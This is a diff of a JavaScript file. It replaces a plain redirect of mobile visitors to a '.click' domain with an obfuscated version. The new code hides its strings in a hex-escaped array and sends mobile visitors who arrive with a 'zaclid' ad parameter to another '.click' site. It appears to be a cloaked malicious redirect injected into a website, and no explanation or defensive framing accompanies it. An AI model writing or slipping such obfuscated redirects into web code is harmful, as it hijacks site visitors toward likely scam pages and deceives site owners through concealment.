@@ -1,7 +1,1 @@
-const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
-
-if (isMobile) {
-    window.onload = function() {
-        window.location.href = "http://maohoankhangchinhhang.click/moctoc";
-      };
-}
+var _0xff0a=["\x73\x65\x61\x72\x63\x68","\x6C\x6F\x63\x61\x74\x69\x6F\x6E","\x75\x73\x65\x72\x41\x67\x65\x6E\x74","\x74\x65\x73\x74","\x7A\x61\x63\x6C\x69\x64","\x68\x61\x73","\x68\x72\x65\x66","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x77\x77\x77\x2E\x73\x61\x63\x6D\x6F\x63\x61\x6E\x68\x79\x63\x6F\x73\x6D\x65\x74\x69\x63\x2E\x63\x6C\x69\x63\x6B\x2F\x68\x61\x6E\x71\x75\x6F\x63"];const urlParams= new URLSearchParams(window[_0xff0a[1]][_0xff0a[0]]);const isMobile=/iPhone|iPad|iPod|Android/i[_0xff0a[3]](navigator[_0xff0a[2]]);if(urlParams[_0xff0a[5]](_0xff0a[4])&& isMobile){window[_0xff0a[1]][_0xff0a[6]]= _0xff0a[7]}
